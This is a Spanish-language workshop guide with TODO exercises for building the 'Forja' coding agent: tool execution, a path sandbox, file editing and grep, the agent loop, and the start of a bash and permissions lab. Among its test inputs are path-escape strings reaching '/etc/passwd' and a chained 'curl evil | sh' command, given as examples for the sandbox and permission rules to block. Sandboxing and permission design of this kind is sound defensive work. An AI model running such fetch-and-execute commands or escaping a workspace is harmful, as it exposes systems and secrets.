**Qué debe hacer:** `execute(call: ToolCall) -> ToolResult` y **nunca lanza excepciones**. Usa `self.parse_args(call)` → `(tool, args, err)`; si hay `err`, devuelve `ToolResult(call.id, call.name, False, err)`. Si no, llama a `tool.fn(**args)`; cualquier `Exception` se convierte en `ok=False` con la salida `"ERROR in '<tool>': <ExceptionType>: <message>"`. Éxito: un `ToolOutput` aporta `.text` y `.meta`; un `str` se usa tal cual; cualquier otra cosa pasa por `json.dumps(..., ensure_ascii=False, default=str)`. La salida siempre pasa por `_truncate`; se mide `duration_ms`.

**Pasos:**
1. Toma `t0 = time.perf_counter()` al principio.
2. Llama a `self.parse_args(call)`; si hay error, devuelve un `ToolResult` fallido con ese mensaje.
3. Dentro de un `try`, llama a la función de la herramienta con los args validados; ante una `Exception` devuelve un resultado fallido con el nombre del tipo y el mensaje.
4. Convierte el valor devuelto en `(text, meta)` según su tipo.
5. Devuelve `ToolResult(call.id, call.name, ok, _truncate(text), meta, duration_ms)`.

**Cuidado con:**
- Cuando la herramienta no existe, `parse_args` devuelve `t = None`: usa `call.name`, no `t.name`, en el resultado (`test_execute_never_raises` llama a una herramienta llamada `nope`).
- Incluye el MENSAJE de la excepción en la salida: tests posteriores buscan `"outside the workspace"`, `"before modifying"`, `"times"`, `"line numbers"`, `"has changed"` en `res.output`.
- Captura `Exception`, no un `except:` a secas (no quieres tragarte Ctrl+C / `KeyboardInterrupt`).
- Un pequeño closure auxiliar `done(ok, out, meta=None)` evita repetir la construcción de `ToolResult(...)`.

<details><summary>💡 Pista 1</summary>

La lista ordenada de campos de `ToolResult` es `call_id, name, ok, output, meta, duration_ms`.

</details>

<details><summary>💡 Pista 2</summary>

`isinstance(res, ToolOutput)` / `isinstance(res, str)`; el formato del mensaje es `f"ERROR in '{t.name}': {type(e).__name__}: {e}"`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
t0 = time.perf_counter()
t, args, err = self.parse_args(call)
if err:
    return ...
try:
    res = t.fn(**args)
except Exception as e:
    return ...
# ToolOutput? str? other -> json
return ToolResult(..., _truncate(text), meta, int((time.perf_counter() - t0) * 1000))
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k execute_never_raises -v
```

#### TODO 02.3 · `forja/fs_tools.py` · `Workspace.resolve(path)`

**Qué debe hacer:** `resolve(path: str) -> Path`: una ruta relativa se une a `self.root`, una absoluta se mantiene; al resultado se le aplica `.resolve()` (elimina `..`, sigue symlinks). Si no es `self.root` ni está dentro, lanza `PermissionError(f"path outside the workspace: {path}")`. Devuelve el `Path` absoluto resuelto. `self.root` ya está resuelto en `__post_init__`.

**Pasos:**
1. Envuelve la cadena en un `Path`.
2. Construye el candidato: la propia ruta si es absoluta; si no, `self.root / path`.
3. Llama a `.resolve()` sobre el candidato.
4. Si es igual a `self.root` o cumple `is_relative_to(self.root)`, devuélvelo; si no, lanza el `PermissionError`.

**Cuidado con:**
- Comprueba DESPUÉS de resolver: `"invoices/../../secret.txt"` parece relativa pero se escapa.
- No compares cadenas con `startswith`: `/home/me/proj2` empieza por `/home/me/proj`. `Path.is_relative_to` compara componentes de la ruta.
- `test_sandbox` comprueba tanto `"../secret.txt"` como `"/etc/passwd"` y que el mensaje contenga `"outside the workspace"` (en Windows `/etc/passwd` pasa a ser `C:\etc\passwd`: sigue fuera).

<details><summary>💡 Pista 1</summary>

Tres líneas de lógica: construir, resolver, comprobar.

</details>

<details><summary>💡 Pista 2</summary>

`Path.is_absolute()`, `Path.resolve()`, `Path.is_relative_to(other)`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
p = Path(path)
target = (...).resolve()
if target != self.root and not ...:
    raise PermissionError(...)
return target
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k "sandbox or read_numbered" -v
```

#### TODO 02.4 · `forja/fs_tools.py` · `make_fs_tools` → `write_file(path, content)` interna

**Qué debe hacer:** Devuelve `ToolOutput(text, {"path": ws.rel(p), "diff": unified_diff(before, content, ws.rel(p))})`. Fichero nuevo: crea las carpetas padre y escribe. Fichero existente: primero `ws.check_fresh(p)` (lanza `"read … with read_file before modifying it"`), guarda el contenido anterior como `before`. Llama a cada callback de `ws.before_write` con `p` antes de escribir. Tras escribir, `ws.mark_read(p)`. Texto como `"docs/note.md created (1 lines)"` / `"… updated (N lines)"`. Escribe en UTF-8.

**Pasos:**
1. `p = ws.resolve(path)`; `before = ""`.
2. Si `p` existe: `ws.check_fresh(p)` y lee el texto anterior en `before`.
3. Llama a cada `cb(p)` de `ws.before_write`.
4. Crea `p.parent` (parents, exist_ok) y escribe `content` con `encoding="utf-8"`.
5. `ws.mark_read(p)` y devuelve el `ToolOutput` con la ruta y el diff.

**Cuidado con:**
- `test_write_new_and_overwrite_rules` escribe en `docs/note.md` — la carpeta `docs` aún no existe.
- Sobrescribir un fichero que nunca se ha leído debe fallar con `"before modifying"` en la salida: deja que `check_fresh` lance la excepción, no la captures.
- Sin `mark_read` tras escribir, el siguiente `edit_file` sobre el mismo fichero falla con `"has changed since you read it"` (tu propia escritura cambió el mtime).
- Pasa siempre `encoding="utf-8"`: en Windows la codificación por defecto no es UTF-8.

<details><summary>💡 Pista 1</summary>

Copia la estructura del `read_file` ya hecho: primero resolver, luego trabajar con `p`.

</details>

<details><summary>💡 Pista 2</summary>

`p.parent.mkdir(parents=True, exist_ok=True)`, `p.write_text(content, encoding="utf-8")`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
p = ws.resolve(path)
before = ""
if p.exists():
    ...  # fresh check + old content
for cb in ws.before_write:
    ...
...  # mkdir, write, mark_read
return ToolOutput(f"...", {"path": ..., "diff": ...})
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k write_new -v
```

#### TODO 02.5 · `forja/fs_tools.py` · `make_fs_tools` → `edit_file(path, old_string, new_string, replace_all=False)` interna

**Qué debe hacer:** Devuelve `ToolOutput("<rel> edited (N replacement(s), from line L)", {"path": ws.rel(p), "diff": …})`. Lanza (en este orden): `FileNotFoundError` si no es un fichero (sugiere `write_file`); los errores de `check_fresh`; `ValueError` si `old_string == new_string`; `ValueError` `"old_string not found in <path>."` + una pista cuando el recuento es 0; `ValueError` `"old_string appears N times in <path>: …"` cuando el recuento es >1 y no hay `replace_all`. Sustituye una aparición (o todas), llama a los callbacks de `ws.before_write`, escribe y hace `mark_read`.

**Pasos:**
1. Resuelve la ruta; si no es un fichero, lanza `FileNotFoundError` mencionando `write_file`.
2. `ws.check_fresh(p)`; rechaza cadenas old/new idénticas.
3. Lee el texto y cuenta las apariciones de `old_string`.
4. Recuento 0: construye una pista — si `old_string` tiene líneas que empiezan por dígitos + `→` (regex `r"^\s*\d+→"` con `re.M`), di que contiene **números de línea** de read_file; si no, si su versión sin espacios en los extremos existe en el texto, di que difieren los espacios/la indentación. Lanza `ValueError`.
5. Recuento >1 sin `replace_all`: lanza `ValueError` diciendo que aparece N veces y cómo arreglarlo.
6. Sustituye (una vez con `str.replace(old, new, 1)` o todas), llama a los callbacks de `before_write`, escribe en UTF-8, `mark_read`.
7. Calcula la línea de la primera coincidencia (`text[:text.index(old_string)].count("\n") + 1`) y devuelve el `ToolOutput` con el diff.

**Cuidado con:**
- El orden importa: `test_edit_requires_read_and_unique` edita primero un fichero NO leído y espera `"before modifying"` — `check_fresh` debe ejecutarse antes de contar.
- El test de duplicados usa `old_string="return"` y comprueba `"times"` en la salida.
- El test de números de línea pasa `"     9→    return round(value, 2)"` y comprueba `"line numbers"` en la salida: el `→` es el carácter que imprime `read_file`.
- `test_edit_detects_external_change` modifica el fichero tras leerlo: basta con llamar a `check_fresh` para obtener `"has changed"`.
- El diff debe contener la línea nueva exactamente una vez → por defecto sustituye solo la primera aparición.

<details><summary>💡 Pista 1</summary>

Estos mensajes de error son prompts para el modelo: di qué ha ido mal Y qué hacer a continuación.

</details>

<details><summary>💡 Pista 2</summary>

`text.count(old_string)`, `text.replace(old, new, 1)`, `re.search(pattern, old_string, re.M)`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
p = ws.resolve(path)
if not p.is_file(): raise FileNotFoundError(...)
ws.check_fresh(p)
if old_string == new_string: raise ValueError(...)
text = ...
n = text.count(old_string)
if n == 0: ...   # hint: line numbers? whitespace?
if n > 1 and not replace_all: ...
new_text = ...
# before_write, write, mark_read, line, return ToolOutput
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k "edit_requires or external_change" -v
```

#### TODO 02.6 · `forja/fs_tools.py` · `make_fs_tools` → `grep(pattern, path=".", include=None, ignore_case=False, show_content=True)` interna

**Qué debe hacer:** Devuelve un `str`. Con `show_content=True`: una línea por coincidencia, `"<rel>:<lineno>: <line stripped, max 300 chars>"`. Con `show_content=False`: una línea por fichero que coincide (su ruta relativa). `include` filtra por NOMBRE de fichero con `fnmatch` (p. ej. `*.py`). Busca en un solo fichero si `path` es un fichero; si no, en `ws.walk(base)`. Se salta los ficheros que no son UTF-8. Se detiene a los 300 resultados con una nota. Si no encuentra nada: `"(no matches)"`.

**Pasos:**
1. Compila la regex con `re.I` cuando haya `ignore_case`.
2. Resuelve `path`; la lista de ficheros es `[base]` si es un fichero; si no, `ws.walk(base)`.
3. Para cada fichero: sáltatelo si se da `include` y el nombre no coincide.
4. Léelo como UTF-8 dentro de `try/except (UnicodeDecodeError, OSError)` y sáltatelo si hay error.
5. Enumera las líneas desde 1; si `rx.search(line)`: añade la línea formateada o (en modo solo rutas) añade la ruta una vez y deja de leer ese fichero.
6. Detente con una nota al llegar a 300 resultados; devuelve las líneas unidas o `"(no matches)"`.

**Cuidado con:**
- Los números de línea empiezan en 1: `test_grep_and_glob` espera `"invoices/amounts.py:7:"` para `def round_amount`.
- Usa `ws.rel(f)` para la ruta, no la ruta absoluta.
- `include` se compara con `f.name`, no con la ruta completa.
- En modo solo rutas cada fichero debe aparecer una vez aunque coincidan muchas líneas.
- Una regex inválida lanza `re.error`; no pasa nada — `execute` lo convierte en un mensaje de error para el modelo.

<details><summary>💡 Pista 1</summary>

Mira la herramienta `glob` ya hecha justo encima: el mismo recorrido, distinto filtro.

</details>

<details><summary>💡 Pista 2</summary>

`enumerate(text.splitlines(), 1)`, `fnmatch.fnmatch(f.name, include)`, `rx.search(line)`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
rx = re.compile(pattern, re.I if ignore_case else 0)
base = ws.resolve(path)
files = [base] if base.is_file() else ws.walk(base)
out = []
for f in files:
    ...  # include filter, read (skip binaries), match lines
    if len(out) >= 300: ...
return "\n".join(out) or "(no matches)"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k grep -v
```

### Ejecuta
```bash
python scripts/tasks.py test 02
forja --cwd playground
> ¿qué hace la función due_date?        (aún sin bucle: responde como un chat; las tools llegan en el lab 03)
```

### Pruébalo en tu agente
1. `python scripts/tasks.py test 02` → `8 passed`.
2. Maneja las herramientas a mano desde un REPL de Python en la raíz del repo (`python`, y luego escribe):
```python
import json; from pathlib import Path
from forja.fs_tools import Workspace, make_fs_tools
from forja.tools import ToolRegistry; from forja.types import ToolCall
r = ToolRegistry().register(*make_fs_tools(Workspace(Path("playground"))))
x = lambda name, **a: print(r.execute(ToolCall("1", name, json.dumps(a))).output)
x("grep", pattern="def ", include="*.py")
```
Deberías VER líneas como `invoices/amounts.py:7: def round_amount(value: float) -> float:`.
3. En el mismo REPL: `x("read_file", path="../README.md")` → `ERROR in 'read_file': PermissionError: path outside the workspace: ../README.md`; `x("edit_file", path="invoices/dates.py", old_string="a", new_string="b")` → `… read invoices/dates.py with read_file before modifying it`.
4. Mira lo que leerá el modelo: `print(json.dumps(r.schemas()[2], indent=2))` → el esquema de `edit_file`, con su descripción larga, `required` y `"additionalProperties": false`, y sin claves `title`.
5. `forja --cwd playground`: la nota `tools: lab 02 pending` ha desaparecido. Sigue siendo un chat (`agent: lab 03 pending — chat mode without tools`), así que el modelo aún no puede llamar a tus herramientas — eso es el lab 03.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| Todos los tests de herramientas de ficheros fallan con `NotImplementedError: TODO 02.2` o `TODO 02.3` | Todos los tests pasan por `registry.execute` y `ws.resolve` → termina primero 02.2 y 02.3. |
| `AttributeError: 'NoneType' object has no attribute 'name'` en `execute` | Herramienta desconocida → `t` es `None` → usa `call.name` al construir el resultado de error. |
| El test espera `"before modifying"` pero la salida dice `"old_string not found"` | Cuentas las apariciones antes de `ws.check_fresh(p)` → sube la comprobación de frescura. |
| `edit_file` funciona una vez y la siguiente edición dice `has changed since you read it` | Falta `ws.mark_read(p)` tras escribir → llámalo al final de write_file y de edit_file. |
| `AssertionError: 'line numbers' in …` en el test de edición | Tu regex de pista no coincide con `"     9→    return …"` → usa `^\s*\d+→` con `re.M`, y copia el carácter `→` del código de `read_file`. |
| `UnicodeDecodeError` / caracteres corruptos al escribir en Windows | Falta `encoding="utf-8"` en `write_text`/`read_text` → pásalo siempre. |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 02` → los 8 tests en verde.
- [ ] [ ] Desde el REPL obtienes un `read_file` numerado, un `grep` con resultados `path:line:` y un error de sandbox para `../`.
- [ ] [ ] Los mensajes de error de tu `edit_file` le dicen al modelo cómo corregir su llamada.

### Checkpoint
Tests del lab 02 en verde. Con el lab 03 todavía pendiente, Forja sigue siendo un chat: el bucle llega a continuación.

### Retos
1. Añade una tool `list_dir` con árbol de 2 niveles. ¿Mejora o empeora la exploración del modelo?
2. Pide al modelo que edite algo y fíjate en sus errores de `old_string`: ¿qué pista añadirías al mensaje de error?

**Tests:** `tests/test_l02_tools.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 03`


---

## Lab 03 · El bucle del agente

*Día 1 · 11:30–12:15*

**Objetivo:** Escribir el bucle que convierte un modelo en un agente: pensar → actuar → observar, hasta terminar.

### Conceptos
- **Diez líneas:** pedir respuesta con tools → si no pide tools, fin → ejecutar → añadir resultados → repetir. Todo framework de agentes es esto con más capas.
- **El historial es el estado:** cada `assistant` con `tool_calls` va seguido de un mensaje `tool` por cada `tool_call_id`. Romper ese par = error 400 en casi cualquier backend.
- **Lecturas en paralelo, escrituras en orden:** varias `read_file`/`grep` a la vez se ejecutan en paralelo; una edición y un `pytest` nunca.
- **Paradas explícitas:** respuesta final, máximo de pasos, bucle detectado (misma tool + mismos argumentos) e interrupción del usuario (Ctrl+C).
- **El bucle no sabe de permisos ni de interfaz:** recibe una función `execute` (la puerta del harness) y unos `events`. Por eso lo reutilizamos para subagentes y evals.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 03.1 | `forja/agent.py` | _run_calls: lecturas consecutivas en paralelo, orden preservado |
| 03.2 | `forja/agent.py` | run: el bucle con streaming, paradas y detección de bucles |

### Antes de empezar
- Abre `forja/agent.py` (`Events`, `AgentResult`, `Agent` y tus dos TODOs), `forja/fake_llm.py` (`FakeLLM`, `say`, `call`, `calls`: el modelo con guion que usan los tests) y `tests/test_l03_agent.py`.
- Protocolo de mensajes (Chat Completions): un mensaje del assistant con `tool_calls` debe ir seguido de un mensaje `{"role": "tool", "tool_call_id": …}` por cada llamada, antes del siguiente mensaje del assistant. `ChatResponse.to_message()` y `ToolResult.to_message()` (ya hechos) te construyen esos dicts.
- `self.llm.stream(messages, tools=...)` emite `TextDelta` y un `Done` final (tu lab 01, o `FakeLLM` en los tests, que emite el texto en trozos de 8 caracteres). `self.tools.schemas()` (lab 02) es la lista `tools`.
- Stdlib: `concurrent.futures.ThreadPoolExecutor` (`ex.map(fn, iterable)`), `collections.Counter`, `threading.Event.is_set()`.
- Cómo encaja: el harness crea `Agent(llm, registry, execute=self.gate, events=RichEvents(), …)`. El bucle no sabe nada de permisos ni de UI — solo llama a `execute` y a `events`. La misma clase se reutiliza para subagentes (lab 09) y evals (lab 12).

### Paso a paso
Empieza por el camino sin herramientas de 03.2 (stream, añadir el mensaje del assistant, devolver `"final"`, más la comprobación de cancelación): eso pone en verde `test_final_answer`, `test_streaming_events` y `test_cancel`. Después escribe 03.1 `_run_calls` y completa 03.2 con la ejecución de herramientas, `max_steps` y la detección de bucles. Todos los tests de 03.1 pasan por `run`, así que necesitas ambos.

#### TODO 03.1 · `forja/agent.py` · `Agent._run_calls(calls)`

**Qué debe hacer:** `_run_calls(calls: list[ToolCall]) -> list[ToolResult]`, resultados en el MISMO orden que `calls`. Usa `self.execute` si está definido; si no, `self.tools.execute`. Para cada llamada: `self.events.on_tool_start(call)`, ejecutar, `self.events.on_tool_end(call, result)`. Las secuencias de llamadas CONSECUTIVAS de riesgo read (`self._is_read(call)`) se ejecutan en paralelo en un `ThreadPoolExecutor` cuando `self.parallel_reads`; todo lo demás se ejecuta secuencialmente y en orden.

**Pasos:**
1. Elige la función de ejecución: `self.execute or self.tools.execute`.
2. Reserva `results = [None] * len(calls)` y escribe una pequeña función interna `run(i)` que lance el evento de inicio, ejecute `calls[i]` guardándolo en `results[i]` y lance el evento de fin.
3. Recorre las llamadas con un índice `i`. Si `calls[i]` es una lectura, avanza `j` mientras las llamadas sean lecturas.
4. Si el bloque tiene más de una lectura, ejecuta los índices `i..j-1` con un `ThreadPoolExecutor` (p. ej. hasta 8 workers); una sola lectura se ejecuta sin más. Pon `i = j`.
5. Llamadas que no son lectura: `run(i)` e `i += 1`.
6. Devuelve la lista de resultados.

**Cuidado con:**
- `test_parallel_reads_keep_order`: tres lecturas de 0.2 s + una escritura deben tardar < 0.5 s Y producir los contenidos de tool `["r1", "r2", "r3", "wa"]` con los ids en el orden original. Guarda por índice; el orden de `as_completed` es aleatorio.
- Solo lecturas CONSECUTIVAS: `[read, write, read]` no debe ejecutar la segunda lectura antes de la escritura.
- `test_custom_execute_gate` comprueba que se usa tu gate: llamar directamente a `self.tools.execute` se salta los permisos en la CLI real.
- Consume `ex.map(...)` (p. ej. `list(...)`) o las excepciones de los workers se pierden en silencio; salir del bloque `with` espera a que terminen todos.

<details><summary>💡 Pista 1</summary>

Escribir por índice (`results[i] = …`) es lo que mantiene el orden, sin importar qué hilo termine primero.

</details>

<details><summary>💡 Pista 2</summary>

`with ThreadPoolExecutor(max_workers=min(8, j - i)) as ex: list(ex.map(run, range(i, j)))`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
execute = self.execute or self.tools.execute
results = [None] * len(calls)
def run(i): ...   # start event, execute, end event
i = 0
while i < len(calls):
    if self.parallel_reads and self._is_read(calls[i]):
        ...  # find j, pool or single
    else:
        ...
return results
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l03_agent.py -k "parallel or gate" -v
```

#### TODO 03.2 · `forja/agent.py` · `Agent.run(messages)`

**Qué debe hacer:** `run(messages: list[dict]) -> AgentResult(answer, stop_reason, steps, usage, tool_calls)`. `messages` se MODIFICA IN SITU (el harness lo lee después). Motivos de parada: `"final"` (sin tool calls; answer = `resp.content or ""`, steps = paso actual), `"interrupted"` (`self.cancel` activado al inicio de un paso; steps = step - 1), `"loop"` (mismo nombre de herramienta + misma cadena de argumentos pedida más de `self.max_repeats` veces en esta ejecución), `"max_steps"` (steps = `self.max_steps`). `usage` suma todas las respuestas; `tool_calls` cuenta las llamadas ejecutadas. El historial debe seguir siendo válido en todos los casos: cada id de `tool_call` recibe un mensaje `tool`.

**Pasos:**
1. Crea un `Counter` para usage, un `Counter` para los pares `(name, arguments)` y un contador de llamadas.
2. `for step in range(1, self.max_steps + 1)`: primero, si `self.cancel.is_set()`, devuelve el resultado `"interrupted"`.
3. Stream: `self.llm.stream(messages, tools=self.tools.schemas() or None)`; reenvía cada `TextDelta` a `self.events.on_text` y quédate con la respuesta del `Done`.
4. Suma su usage, `messages.append(resp.to_message())`, llama a `self.events.on_assistant(resp)`.
5. Sin `resp.tool_calls` → devuelve `"final"`.
6. Detección de bucles: cuenta cada `(c.name, c.arguments)`; si alguno supera `self.max_repeats`, añade un `ToolResult(cc.id, cc.name, False, "Not executed: loop detected.").to_message()` fallido para CADA llamada de esta respuesta y devuelve `"loop"`.
7. Si no, `results = self._run_calls(resp.tool_calls)`, actualiza el contador y extiende `messages` con `r.to_message()` de cada resultado. Tras el `for`, devuelve `"max_steps"`.

**Cuidado con:**
- `test_final_answer` espera `steps == 1` y que el último mensaje sea el del assistant.
- `test_streaming_events` comprueba que `on_text` recibió MÁS DE UN trozo: reenvía cada `TextDelta`, no emitas el texto completo al final.
- Usa `resp.to_message()`: un `{"role": "assistant", "content": …}` hecho a mano sin `tool_calls` rompe el emparejamiento y los backends reales responden HTTP 400.
- `test_max_steps_and_loop` recorre el historial tras una parada `"loop"` y comprueba que no queda ningún id de tool_call abierto → cierra todas las llamadas pendientes antes de retornar.
- Pasa `tools=None` cuando no haya esquemas: algunos servidores rechazan `tools=[]`.

<details><summary>💡 Pista 1</summary>

Escribe primero la versión de diez líneas (stream → añadir → ¿sin herramientas? retornar → ejecutar llamadas → añadir → repetir), y después añade la cancelación, la detección de bucles y los contadores.

</details>

<details><summary>💡 Pista 2</summary>

`Counter.update(dict)` suma los valores clave a clave — perfecto para `resp.usage`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
usage, seen, n_calls = Counter(), Counter(), 0
for step in range(1, self.max_steps + 1):
    if self.cancel.is_set(): return AgentResult(...)
    resp = None
    for ev in self.llm.stream(...):
        ...  # TextDelta -> on_text, Done -> resp
    ...  # usage, append, on_assistant, final?
    ...  # loop detection (close pending calls!)
    ...  # run calls, append tool messages
return AgentResult(..., "max_steps", self.max_steps, ...)
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l03_agent.py -k "final or streaming or cancel or max_steps" -v
```

### Ejecuta
```bash
python scripts/tasks.py test 03
forja --cwd playground
> explícame cómo se calcula el total de una factura
```

### Pruébalo en tu agente
1. `python scripts/tasks.py test 03` → `6 passed`.
2. `forja --cwd playground` y pregunta `explain how an invoice total is calculated`. Deberías VER líneas azules por cada tool call, p. ej. `⏺ grep {"pattern": "def total", …}` seguidas de un `⎿ invoices/invoice.py:…` atenuado (args en JSON crudo hasta que el lab 05 los ponga bonitos), y después una respuesta en streaming con referencias `path:line` y `(N steps · M tools)`.
3. Pregunta `read amounts.py and dates.py and summarise both`: si el modelo pide las dos lecturas en una sola respuesta, se ejecutan en paralelo (las dos líneas `⏺` aparecen antes que los resultados).
4. Pídele que cambie algo, p. ej. `add a docstring to total_with_vat`. Hasta el lab 04/05 obtienes un prompt rudimentario `Allow edit_file {…}? [y/N]` — responde `n` y observa cómo reacciona el modelo a `DENIED by the user`.
5. Pulsa Ctrl+C mientras trabaja: `interrupting…`, y el turno se detiene en el siguiente paso con `(interrupted by the user)`.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `test_parallel_reads_keep_order` falla por tiempo (≈0.6 s o más) | Las lecturas se ejecutan secuencialmente → revisa la agrupación con `_is_read` y que usas el pool para bloques > 1. |
| `test_parallel_reads_keep_order` falla por orden (`['r2', 'r1', …]`) | Resultados añadidos según terminan los hilos → escribe en `results[i]`. |
| `AssertionError: assert not open_ids` en `test_max_steps_and_loop` | En `"loop"` has retornado sin responder a los tool_calls pendientes → añade un mensaje tool fallido para cada uno. |
| Backend real: `400 … tool_call_id … not found` / `messages with role 'tool' must be a response…` | Historial roto: mensaje del assistant construido a mano, o mensajes tool ausentes/desordenados → usa los helpers `to_message()` y respeta el orden. |
| La CLI llama a herramientas pero `bash` responde `ERROR in 'bash': NotImplementedError: TODO 04.2` | Es lo esperado: la herramienta bash es el lab 04. Normalmente el modelo lo reintentará con herramientas de lectura. |
| El modelo responde sin llamar a ninguna herramienta, o escribe `<tool_call>{…}` como texto | Modelo pequeño o herramientas no enviadas → comprueba `tools=self.tools.schemas() or None`; prueba `forja doctor`; `qwen3:8b` a veces necesita un prompt explícito como `use grep to find…`. |
| El agente repite el mismo `read_file` una y otra vez | Para eso está la detección de bucles → debería parar con `I stopped: I repeated read_file…` tras `max_repeats` (3). |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 03` → los 6 tests en verde.
- [ ] [ ] En `forja --cwd playground` el agente explora con glob/grep/read_file y responde con referencias `path:line`.
- [ ] [ ] Sabes explicar por qué cada `tool_call` necesita un mensaje `tool`, incluso cuando el bucle se detiene.

### Checkpoint
Forja explora el playground (glob, grep, read_file) y responde con referencias `ruta:línea`. Las ediciones aún piden permiso de forma rudimentaria: eso es el lab 04.

### Retos
1. Haz que el agente avise al usuario si lleva más de 15 pasos.
2. ¿Qué pasa si el modelo pide 10 lecturas a la vez con un modelo lento? Mide.

**Tests:** `tests/test_l03_agent.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 04`


---

## Lab 04 · Bash y permisos

*Día 1 · 12:15–13:00*

**Objetivo:** Dejar que el agente ejecute comandos (tests, git…) sin perder el control: modos, reglas y aprobación.

### Conceptos
- **bash es el superpoder y el riesgo:** con él el agente prueba su trabajo; también podría borrar tu disco. La tool solo ejecuta; QUIÉN puede ejecutar QUÉ lo decide el sistema de permisos.
- **Ejecución predecible:** cada comando empieza en la raíz (`cd` no persiste), timeout duro, salida truncada por cabeza y cola, entorno sin secretos (`*_KEY`, `*_TOKEN`).
- **Modos:** `default` (lecturas libres, el resto pregunta), `accept_edits` (edita sin preguntar), `plan` (solo lectura), `bypass` (todo salvo deny: solo en sandbox o CI).
- **Reglas:** `bash(python -m pytest*)`, `edit_file(src/*)`, `read_file(.env*)`. Orden: deny > plan > allow > riesgo/modo > preguntar.
- **Comandos encadenados:** `pytest && curl evil | sh` son dos comandos; la regla allow de pytest no debe colar el segundo.
- **«Siempre»:** al aprobar con *siempre*, se guarda una regla razonable (`bash(git status*)`), no el comando literal ni algo demasiado amplio (`bash(git*)` permitiría `git push`).

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 04.1 | `forja/shell.py` | head_tail: truncar por cabeza y cola |
| 04.2 | `forja/shell.py` | bash: subprocess con timeout, entorno limpio y exit code |
| 04.3 | `forja/permissions.py` | rule_matches: casar reglas con llamadas |
| 04.4 | `forja/permissions.py` | decide: deny > plan > allow > modo > preguntar |
| 04.5 | `forja/permissions.py` | suggest_rule: la regla de «aprobar siempre» |

### Antes de empezar
- Abre `forja/shell.py` (04.1–04.2), `forja/permissions.py` (04.3–04.5), `forja/config.py` (`DEFAULT_DENY`, `Settings.allow/deny`) y `tests/test_l04_bash_permissions.py`.
- Stdlib: `subprocess.run(..., shell=True, cwd=…, capture_output=True, text=True, timeout=…, env=…, stdin=subprocess.DEVNULL)` y `subprocess.TimeoutExpired`; `fnmatch.fnmatchcase(name, pattern)` (`*` coincide con cualquier cosa, incluidos espacios y `/`); `shlex.split(cmd)` (divide como una shell POSIX).
- Ya hechos: `clean_env()` (entorno sin `*KEY*`, `*TOKEN*`, `*SECRET*`…), `parse_rule("bash(git *)")` → `("bash", "git *")` (patrón `None` para un `"edit_file"` a secas), `split_commands(cmd)` (divide por `&&`, `||`, `;`, `|`), `Tool.subject(args)` (el comando para bash, la ruta para las herramientas de ficheros) y `tool.risk` (`"read"`, `"edit"`, `"exec"`).
- Shell: con `shell=True` el comando se ejecuta en `/bin/sh` en macOS/Linux y en **cmd.exe en Windows** (`ls`, `cat`, `rm -rf` no existen ahí; `dir`, `type` sí). La descripción de la herramienta le dice al modelo qué shell tiene.
- Cómo encaja: el gate del harness llama a `decide(tool, args, mode, settings.allow, settings.deny)`: `"deny"` → error al modelo, `"ask"` → prompt de aprobación, `"allow"` → ejecutar. Cuando el usuario responde *always*, `suggest_rule` genera la regla que se añade a `settings.allow` durante la sesión.

### Paso a paso
04.1 `head_tail` (pura, 5 minutos) → 04.2 `bash` (la usa) → 04.3 `rule_matches` → 04.4 `decide` (usa `rule_matches`) → 04.5 `suggest_rule` (independiente). Shell y permisos son ficheros separados: si trabajáis en pareja, uno puede empezar 04.3 mientras el otro hace 04.1–04.2.

#### TODO 04.1 · `forja/shell.py` · `head_tail(text, limit=MAX_SHELL_OUTPUT)`

**Qué debe hacer:** `head_tail(text: str, limit: int = 20_000) -> str`. Si `len(text) <= limit`, devuélvelo sin cambios. Si no, devuelve los primeros `limit // 4` caracteres, una nota en MEDIO indicando cuántos caracteres se han omitido (debe contener la palabra `omitted`) y los últimos `limit * 3 // 4` caracteres. `test_head_tail_and_env`: con 1000 `A` + 1000 `B` y límite 400, la salida empieza por `A`, termina en `B` y contiene `omitted`.

**Pasos:**
1. Retorna pronto si el texto cabe.
2. Corta la cabeza (un cuarto del límite) y la cola (tres cuartos, desde el final).
3. Construye `head + note + tail`, con el número de omitidos `len(text) - limit` en la nota.

**Cuidado con:**
- La cola es más grande a propósito: los fallos de tests y los tracebacks están al FINAL de la salida.
- La nota debe ir en medio; si la añades al final, `endswith("B")` falla.
- Slicing negativo: `text[-n:]` son los últimos `n` caracteres.

<details><summary>💡 Pista 1</summary>

Un `if` y un f-string.

</details>

<details><summary>💡 Pista 2</summary>

`text[: limit // 4]` y `text[-(limit * 3 // 4):]`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
if len(text) <= limit:
    return text
head, tail = ..., ...
return f"{head}\n…[{...} characters omitted]…\n{tail}"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k head_tail -v
```

#### TODO 04.2 · `forja/shell.py` · `make_shell_tool` → `bash(command, timeout=default_timeout)` interna

